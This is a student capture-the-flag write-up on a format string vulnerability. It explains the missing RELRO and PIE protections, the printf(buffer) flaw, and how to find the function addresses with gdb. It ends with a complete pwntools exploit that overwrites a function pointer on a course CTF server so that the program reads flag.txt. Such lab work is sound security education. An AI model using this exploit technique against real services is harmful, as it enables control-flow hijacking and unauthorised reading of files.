# CTF Semana #6 (Format Strings)

## Context

The goal of this week's CTF challenge is to apply techniques learned from SEED Labs about format string vulnerabilities. Specifically, the challenge involves reading from and writing to arbitrary memory addresses, not limited to the stack. A ZIP file is provided containing an executable (`program`) and its source code (`main.c`). The flag is located in a `flag.txt` file, which is read by the program. A Python script (`exploit-template.py`) is also provided to assist in crafting the exploit.

# Task 1: Checking the program protections

Using ```$ checksec program```, we can see what protections are enabled and what kinds of attacks are possible:
![checksec](/docs/images/ctf6checksec.png)

### **No RELRO (Relocation Read-Only)**
RELRO provides protection for GOT (Global Offset Table) and PLT (Procedure Linkage Table) tables to prevent overwriting of function pointers. Since RELRO is disabled, the GOT is writable. This makes it possible to overwrite function pointers, which is essential for the format string exploit.

### **No PIE (Position-Independent Executable)**
PIE loads the program at a random base address every execution, making it harder to predict addresses for exploitation. Without PIE, the binary has a fixed base address, which makes it easier to find the address of ```readtxt``` and function pointers since they will be consistent across runs. This consistency is crucial for the exploit to work as it allows predictable access to ```readtxt```.

Even with a stack canary, this setup is insufficient to prevent the exploit, as format string vulnerabilities allow arbitrary memory manipulation without directly affecting the stack return address or injecting executable code.

The exploit takes advantage of these weaknesses effectively, leveraging format strings to alter program flow and access sensitive data, in this case, the flag.

# Task 2: Analyzing the program code

Analyzing the code, we can see that the program opens the file `rules.txt` through the function `readtxt`. There is a way to control which file is opened. The program allows the function pointer `fun` to be overwritten due to a format string vulnerability, making it possible to redirect `fun` to the `readtxt` function with an argument of our choosing (in this case, `flag.txt` instead of `rules.txt`). 

There is a format string vulnerability in the `printf(buffer)` function, which is used without format string protections. This vulnerability allows us to write arbitrary data to specific memory addresses. We can exploit it to overwrite the function pointer `fun` with the address of `readtxt`, allowing us to specify "flag.txt" as the file to open and read, thus gaining access to the flag.

# Task 3: Discovering addresses

By having `readtxt_addr` and `fun_addr`, we gain control over the function pointer `fun` and direct it to call `readtxt` with our own choice of arguments. This setup is essential for making the program read "flag.txt" instead of "rules.txt", revealing the flag and achieving the challenge goal.

## Discovering the `fun` address

Every time the program is run, it provides a “hint” that includes a memory address where the `fun` function pointer is stored. We receive this hint and extract its address by parsing the received text. We convert it to an integer to make it easier to use later.

![code1](/docs/images/ctf6code1.png)

## Discovering the `readtxt` address

To find the address of the `readtxt` function, we can use gdb:
![gdb1](/docs/images/ctf6gdb1.png)

![gdb2](/docs/images/ctf6gdb2.png)

The first address that appears after we use `disassemble readtxt` is the address we will use, in this case `0x080497a5`.

# Task 4: Making the exploit

Now we need to create the payload so that we can overwrite the memory in the correct place. We will use the function `fmtstr_payload` from the pwntools library to create a format string payload to overwrite memory. Here, we use it to overwrite `fun_addr` with `readtxt_addr`: `fmtstr_payload(offset, {fun_addr: readtxt_addr})`.

We need to add the `"flag"` prefix to the payload so that it is the file that is called when using the `cat` command. However, the size of the argument that `readtxt` uses is 6 bytes, not 4 like we have in `"flag"`. So, we need to add two more bytes. In this case, we can add the same directory prefix: `"./flag"`, and the command will be the size we want.

We do have a problem now: we can't line up `"./flag"` with the command that we want to overwrite because the offset works in blocks of 4 bytes. Since 6 is not a multiple of 4, to fix this, we can add two additional characters after `"./flag"`. These characters can be anything as long as they are not spaces or special characters that might break the payload. In our case, the final prefix was `"./flagnn"`, having 8 bytes.

Then, we adjust the offset forward by 1 position to compensate for the added characters. This is basically everything we need to know. Then, we just send the payload. 

The final payload will look like this: 
`payload = prefix + fmtstr_payload(3, {fun_addr: readtxt_addr}, num)`. 

We pass the `num` variable (which is the size of the prefix) so that the function accounts for the length of the prefix when generating the format string, ensuring that the generated exploit writes to the correct memory address with the intended value.


# Final exploit code 

```bash
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4005)

# Receive the output
res = r.recvuntil(b"flag:\n")
# Extract the hint (the address) from the output dynamically
hint_line = res.decode().split("I will give you an hint: ")[1].split()[0].strip()
# Convert the hex address to an integer
fun_addr = int(hint_line, 16)

# The address of the 'readtxt' function (in the provided code it's 0x080497a5)
readtxt_addr = 0x080497a5

# Add 'flag' as a prefix
prefix = b"./flagnn"
num = len(prefix) 

# Create the payload with the new offset and add the 'flag' prefix
payload =prefix + fmtstr_payload(3, {fun_addr: readtxt_addr},num)

# Send the crafted payload
r.sendline(payload)

# Receive the response and print the output
response = r.recvall().decode(errors="backslashreplace")
print(response)
# Close the connection
r.close()

```